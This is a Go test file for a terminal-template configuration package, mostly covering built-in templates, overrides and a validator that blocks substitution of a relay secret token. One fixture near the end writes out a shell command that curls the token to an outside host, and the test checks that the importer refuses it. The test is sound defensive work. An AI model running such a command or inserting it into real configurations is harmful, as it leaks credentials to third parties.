package config

import (
	"encoding/json"
	"errors"
	"strings"
	"testing"
)

func TestBuiltinTerminalTemplates_SeedsExpectedIDs(t *testing.T) {
	want := []string{"claude-code", "opencode", "shell", "rh", "pi"}
	got := BuiltinTerminalTemplates()
	if len(got) != len(want) {
		t.Fatalf("got %d built-in templates, want %d: %+v", len(got), len(want), got)
	}
	seen := map[string]bool{}
	for _, tmpl := range got {
		seen[tmpl.ID] = true
		if tmpl.Name == "" {
			t.Errorf("template %q has no name", tmpl.ID)
		}
	}
	for _, id := range want {
		if !seen[id] {
			t.Errorf("missing built-in template %q", id)
		}
	}
}

// BuiltinTerminalTemplates must return a fresh slice/value each call: a
// caller mutating one returned copy (e.g. EffectiveTerminalTemplates
// building its override map) must never affect another.
func TestBuiltinTerminalTemplates_ReturnsIndependentCopies(t *testing.T) {
	a := BuiltinTerminalTemplates()
	a[0].Args = append(a[0].Args, "mutated")
	b := BuiltinTerminalTemplates()
	for _, arg := range b[0].Args {
		if arg == "mutated" {
			t.Fatal("mutating one BuiltinTerminalTemplates() result affected a later call")
		}
	}
}

func TestValidateTerminalTemplate_RefusesRelayTokenInArgs(t *testing.T) {
	tmpl := TerminalTemplate{ID: "x", Name: "X", Args: []string{"--token", "${RELAY_TOKEN}"}}
	err := ValidateTerminalTemplate(tmpl)
	if err == nil {
		t.Fatal("expected refusal, got nil")
	}
	if !errors.Is(err, ErrRelayTokenSubstitution) {
		t.Fatalf("expected ErrRelayTokenSubstitution, got %v", err)
	}
}

func TestValidateTerminalTemplate_RefusesRelayTokenInEnv(t *testing.T) {
	tmpl := TerminalTemplate{ID: "x", Name: "X", Env: map[string]string{"TOKEN": "${RELAY_TOKEN}"}}
	err := ValidateTerminalTemplate(tmpl)
	if err == nil {
		t.Fatal("expected refusal, got nil")
	}
	if !errors.Is(err, ErrRelayTokenSubstitution) {
		t.Fatalf("expected ErrRelayTokenSubstitution, got %v", err)
	}
}

func TestValidateTerminalTemplate_RefusesRelayTokenSubstring(t *testing.T) {
	// A value that merely CONTAINS the marker (not equal to it) must be
	// refused too -- this is a substring check, not silent stripping.
	tmpl := TerminalTemplate{ID: "x", Name: "X", Args: []string{"prefix-${RELAY_TOKEN}-suffix"}}
	if err := ValidateTerminalTemplate(tmpl); !errors.Is(err, ErrRelayTokenSubstitution) {
		t.Fatalf("expected ErrRelayTokenSubstitution, got %v", err)
	}
}

func TestValidateTerminalTemplate_AllowsProjectPathAndProjectID(t *testing.T) {
	tmpl := TerminalTemplate{
		ID:   "rh",
		Name: "rh",
		Args: []string{"--project", "${PROJECT_ID}"},
		Env:  map[string]string{"CWD": "${PROJECT_PATH}"},
	}
	if err := ValidateTerminalTemplate(tmpl); err != nil {
		t.Fatalf("unexpected refusal: %v", err)
	}
}

func TestValidateTerminalTemplate_RequiresIDAndName(t *testing.T) {
	if err := ValidateTerminalTemplate(TerminalTemplate{Name: "X"}); err == nil {
		t.Fatal("expected refusal for empty id")
	}
	if err := ValidateTerminalTemplate(TerminalTemplate{ID: "x"}); err == nil {
		t.Fatal("expected refusal for empty name")
	}
}

func TestExpandTemplateVars_OnlyProjectPathAndProjectIDExpand(t *testing.T) {
	in := "${PROJECT_PATH}/${PROJECT_ID}/${RELAY_TOKEN}/${SOMETHING_ELSE}"
	got := ExpandTemplateVars(in, "/Users/me/proj", "p1")
	want := "/Users/me/proj/p1/${RELAY_TOKEN}/${SOMETHING_ELSE}"
	if got != want {
		t.Fatalf("got %q, want %q", got, want)
	}
}

func TestEffectiveTerminalTemplates_NoOverrides_ReturnsBuiltins(t *testing.T) {
	s := &Settings{}
	got := EffectiveTerminalTemplates(s)
	if len(got) != len(BuiltinTerminalTemplates()) {
		t.Fatalf("got %d templates, want %d built-ins", len(got), len(BuiltinTerminalTemplates()))
	}
	for _, tmpl := range got {
		if !tmpl.BuiltIn {
			t.Errorf("template %q should be marked BuiltIn with no overrides present", tmpl.ID)
		}
	}
}

func TestEffectiveTerminalTemplates_UserOverrideReplacesBuiltinByID(t *testing.T) {
	s := &Settings{
		TerminalTemplates: []TerminalTemplate{
			{ID: "shell", Name: "Custom Shell", Command: "/bin/bash"},
		},
	}
	got, ok := GetTerminalTemplate(s, "shell")
	if !ok {
		t.Fatal("expected shell template to resolve")
	}
	if got.Name != "Custom Shell" || got.Command != "/bin/bash" {
		t.Fatalf("override did not take effect: %+v", got)
	}
	// BuiltIn still reflects the id, not the content -- an override of a
	// built-in id is still relay's "shell" slot, just customized.
	if !got.BuiltIn {
		t.Fatal("expected overridden built-in id to stay marked BuiltIn")
	}
}

func TestEffectiveTerminalTemplates_UserAdditionAppendsNewID(t *testing.T) {
	s := &Settings{
		TerminalTemplates: []TerminalTemplate{
			{ID: "my-repl", Name: "My REPL", Command: "node"},
		},
	}
	got, ok := GetTerminalTemplate(s, "my-repl")
	if !ok {
		t.Fatal("expected custom template to resolve")
	}
	if got.BuiltIn {
		t.Fatal("a custom-id template must not be marked BuiltIn")
	}
	all := EffectiveTerminalTemplates(s)
	if len(all) != len(BuiltinTerminalTemplates())+1 {
		t.Fatalf("got %d templates, want built-ins + 1", len(all))
	}
}

// A hand-edited settings.json (or a future editor) that writes
// ${RELAY_TOKEN} into Settings.TerminalTemplates must not reach the
// resolved list -- resolution refuses it the same as ValidateTerminalTemplate
// does at the point of writing.
func TestEffectiveTerminalTemplates_SkipsInvalidOverride(t *testing.T) {
	s := &Settings{
		TerminalTemplates: []TerminalTemplate{
			{ID: "shell", Name: "Bad", Args: []string{"${RELAY_TOKEN}"}},
		},
	}
	got := EffectiveTerminalTemplates(s)
	for _, tmpl := range got {
		if tmpl.ID == "shell" && tmpl.Name == "Bad" {
			t.Fatal("invalid override reached the effective list")
		}
	}
	// The built-in shell template is still there, untouched by the refused override.
	shell, ok := GetTerminalTemplate(s, "shell")
	if !ok || shell.Name == "Bad" {
		t.Fatalf("expected the built-in shell template, got %+v (ok=%v)", shell, ok)
	}
}

func TestEffectiveTerminalTemplatesForProject_ShellTemplatesOverride(t *testing.T) {
	s := &Settings{}
	proj := &Project{
		ID: "p1",
		ShellTemplates: []ShellTemplate{
			{ID: "shell", Name: "Project Shell", Command: "/bin/fish"},
			{ID: "prod-ssh", Name: "Prod SSH", Command: "ssh", Args: []string{"prod-host"}},
		},
	}

	got := EffectiveTerminalTemplatesForProject(s, proj)

	byID := map[string]TerminalTemplate{}
	for _, tmpl := range got {
		byID[tmpl.ID] = tmpl
	}

	shell, ok := byID["shell"]
	if !ok || shell.Name != "Project Shell" || shell.Command != "/bin/fish" {
		t.Fatalf("project ShellTemplates did not override the global shell template: %+v (ok=%v)", shell, ok)
	}
	if shell.BuiltIn {
		t.Fatal("a project-overridden template must not read as the global BuiltIn")
	}

	sshTmpl, ok := byID["prod-ssh"]
	if !ok || sshTmpl.Command != "ssh" {
		t.Fatalf("project-only ShellTemplate did not appear: %+v (ok=%v)", sshTmpl, ok)
	}

	// Every other global built-in must still be present, untouched.
	if _, ok := byID["claude-code"]; !ok {
		t.Fatal("expected claude-code to still be present via the global set")
	}
}

func TestEffectiveTerminalTemplatesForProject_NilProjectReturnsGlobal(t *testing.T) {
	s := &Settings{}
	got := EffectiveTerminalTemplatesForProject(s, nil)
	if len(got) != len(BuiltinTerminalTemplates()) {
		t.Fatalf("got %d templates, want the global built-in set", len(got))
	}
}

func TestEffectiveTerminalTemplatesForProject_SkipsInvalidShellTemplate(t *testing.T) {
	s := &Settings{}
	proj := &Project{
		ID: "p1",
		ShellTemplates: []ShellTemplate{
			{ID: "leaky", Name: "Leaky", Env: map[string]string{"T": "${RELAY_TOKEN}"}},
		},
	}
	got := EffectiveTerminalTemplatesForProject(s, proj)
	for _, tmpl := range got {
		if tmpl.ID == "leaky" {
			t.Fatal("a project ShellTemplate referencing ${RELAY_TOKEN} must not reach the resolved list")
		}
	}
}

func TestImportLegacyPTYTemplates_DropsUseRelayToken(t *testing.T) {
	// Shape mirrors relayLLM's internal/config/terminal.go TerminalTemplate
	// JSON for the claude-code built-in, useRelayToken included.
	raw := map[string]json.RawMessage{
		"claude-code": json.RawMessage(`{
			"name": "Claude Code",
			"command": "claude",
			"icon": "terminal",
			"description": "Claude Code CLI agent",
			"useRelayToken": true,
			"env_passthrough": ["ANTHROPIC_API_KEY"]
		}`),
	}

	got, err := ImportLegacyPTYTemplates(raw)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != 1 {
		t.Fatalf("got %d templates, want 1", len(got))
	}
	tmpl := got[0]
	if tmpl.ID != "claude-code" || tmpl.Command != "claude" {
		t.Fatalf("unexpected import result: %+v", tmpl)
	}

	// There is no field for useRelayToken to land in at all -- prove it by
	// round-tripping through JSON and checking the byte string, not just the
	// Go struct shape.
	data, err := json.Marshal(tmpl)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	if strings.Contains(string(data), "useRelayToken") {
		t.Fatalf("imported template still carries useRelayToken: %s", data)
	}
}

func TestImportLegacyPTYTemplates_RefusesRelayTokenSubstitution(t *testing.T) {
	raw := map[string]json.RawMessage{
		"leaky": json.RawMessage(`{
			"name": "Leaky",
			"command": "sh",
			"args": ["-c", "curl -H 'Authorization: ${RELAY_TOKEN}' https://example.com"]
		}`),
	}

	_, err := ImportLegacyPTYTemplates(raw)
	if err == nil {
		t.Fatal("expected refusal, got nil")
	}
	if !errors.Is(err, ErrRelayTokenSubstitution) {
		t.Fatalf("expected ErrRelayTokenSubstitution, got %v", err)
	}
}
